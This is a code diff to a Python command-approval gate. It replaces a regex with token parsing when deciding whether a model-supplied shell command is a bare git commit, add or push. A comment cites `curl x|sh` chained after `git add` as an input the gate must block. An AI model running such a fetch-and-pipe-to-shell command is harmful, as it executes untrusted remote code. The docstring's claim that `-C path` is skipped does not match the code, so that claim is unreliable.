@@ -115,15 +115,29 @@ _VALID_FLAGS = set(GATE_INTENT_FLAG.values())
 # invocation — so a chained `git add . && curl x|sh` is never auto-approved.
 _SHELL_SEP_RE = re.compile(r"&&|\|\||;|\||\n|\$\(|`")
 # ATOMIC GROUP, and it matters. `(?:-[A-Za-z]\S*\s+|\S+=\S+\s+)*` is two
-# ambiguous alternatives under a `*`, so a long run of option-like tokens that
-# never reaches commit/add/push backtracks exponentially — and the input is a
-# shell command the MODEL supplies. `re.search` holds the interpreter, so
-# neither Stop nor a signal can preempt it: the turn wedges for good. `(?>...)`
-# (Python 3.11+, and this project requires >=3.11) forbids re-entering the
-# group once it has matched, which is exactly the backtracking that explodes.
-_GIT_HEAD_RE = re.compile(
-    r"^\s*git\s+(?>(?:-[A-Z]\S*|\S+=\S+)\s+)*(?:commit|add|push)\b",
-    re.IGNORECASE)
+# TOKENS, not a regex. The command is a string the MODEL supplies, and the
+# earlier pattern applied a `*` to an alternation of option-like shapes — the
+# denial-of-service shape a scanner asks about, and one that really did wedge a
+# turn: `re.search` holds the interpreter, so neither Stop nor a signal can
+# preempt it. Splitting the line answers the same question in one pass.
+_GIT_VERBS = frozenset({"commit", "add", "push"})
+
+
+def _git_head_verb(cmd: str) -> str:
+    """The git sub-command at the head of ``cmd``, or "".
+
+    Skips the option-ish tokens git allows before its verb (``-C path``,
+    ``--git-dir=…``, ``VAR=value``) and stops at the first real word.
+    """
+    tokens = (cmd or "").strip().split()
+    if not tokens or tokens[0].lower() != "git":
+        return ""
+    for tok in tokens[1:]:
+        if tok.startswith("-") or "=" in tok:
+            continue
+        low = tok.lower()
+        return low if low in _GIT_VERBS else ""
+    return ""
 
 
 def is_commit_command(cmd: str) -> bool:
@@ -135,7 +149,7 @@ def is_commit_command(cmd: str) -> bool:
     cmd = cmd or ""
     if _SHELL_SEP_RE.search(cmd):
         return False
-    return bool(_GIT_HEAD_RE.match(cmd))
+    return bool(_git_head_verb(cmd))
 
 
 # ─────────────────────────── explicit gate flags ────────────────────
